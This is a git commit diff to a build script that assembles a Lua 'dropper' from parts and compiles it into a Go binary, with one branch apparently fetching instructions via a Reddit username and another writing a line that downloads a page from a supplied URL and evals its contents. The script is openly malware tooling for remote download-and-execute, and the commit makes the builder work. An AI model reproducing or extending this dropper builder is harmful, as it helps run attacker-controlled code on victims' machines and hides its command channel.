fa4d935bb589848431e39d6b8195805887057d0a
cyian-1756 <devnull64@vfemail.net>
2020-10-28 00:46:23 -0400

    Got builder working

--- build.sh
+++ build.sh
@@ -5,13 +5,13 @@ if [ $1 = "reddit" ]; then
     cat dropper-parts/http-funcs.lua    >> $DROPPER_NAME
     cat dropper-parts/reddit-funcs.lua  >> $DROPPER_NAME
     cat dropper-parts/eval.lua          >> $DROPPER_NAME
-    echo "local USERNAME = $2\n"        >> $DROPPER_NAME
+    echo "local USERNAME = \"$2\""      >> $DROPPER_NAME
     cat dropper-parts/reddit-logic.lua  >> $DROPPER_NAME
 elif [ $1 = "plaintext" ]; then
     cat dropper-parts/header.lua        > $DROPPER_NAME
     cat dropper-parts/http-funcs.lua    >> $DROPPER_NAME
     cat dropper-parts/eval.lua          >> $DROPPER_NAME
-    echo "local url = $2\n"             >> $DROPPER_NAME
+    echo "local url = \"$2\""           >> $DROPPER_NAME
     echo "eval(getPageContent(url))"    >> $DROPPER_NAME
 else
     echo "[!] Unknown dropper $1"
@@ -19,4 +19,4 @@ fi
 
 $GOPATH/bin/go-bindata dropper.lua
 go build
-# rm bindata.go
+rm bindata.go
